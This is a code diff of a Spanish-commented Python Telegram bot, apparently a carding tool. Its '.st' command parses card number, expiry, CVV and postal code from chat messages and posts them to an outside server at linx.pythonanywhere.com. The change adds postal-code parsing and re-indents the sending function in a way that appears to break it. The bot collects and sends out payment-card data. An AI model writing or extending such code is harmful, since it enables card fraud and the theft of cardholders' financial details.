@@ -497,10 +497,11 @@ def handle_st_command(message):
         card_number = card_data[0]
         expiry = card_data[1]
         cvv = card_data[2]
+        postal_code = card_data[3]
 
         # Generar un nombre aleatorio y un código postal aleatorio
         ## name = generate_name()
-        postal_code = "44200"
+        #postal_code = "44200"
 
         # Procesar el pago
         send_card_info1(card_number, postal_code, expiry, cvv)
@@ -508,15 +509,15 @@ def handle_st_command(message):
     except IndexError:
         bot.reply_to(message, "Por favor, proporciona los datos de la tarjeta en el formato correcto: .st <card_number>|<expiry>|<cvv>")
     
-# Función para enviar los datos de la tarjeta al servidor
-def send_card_info1(card_number, postal_code, expiry, cvv ):
-    SERVER_URL = "https://linx.pythonanywhere.com/card-info"
-    return requests.post(SERVER_URL, json={
-        'card_number': card_number,
-        'expiry': expiry,
-        'cvv': cvv,
-        'postal_code': postal_code
-    })
+ # Función para enviar los datos de la tarjeta al servidor
+ def send_card_info1(card_number, postal_code, expiry, cvv ):
+     SERVER_URL = "https://linx.pythonanywhere.com/card-info"
+     return requests.post(SERVER_URL, json={
+         'card_number': card_number,
+         'expiry': expiry,
+         'cvv': cvv,
+         'postal_code': postal_code
+     })
 
 # Función para manejar el comando .mass
 @bot.message_handler(commands=['mass'])
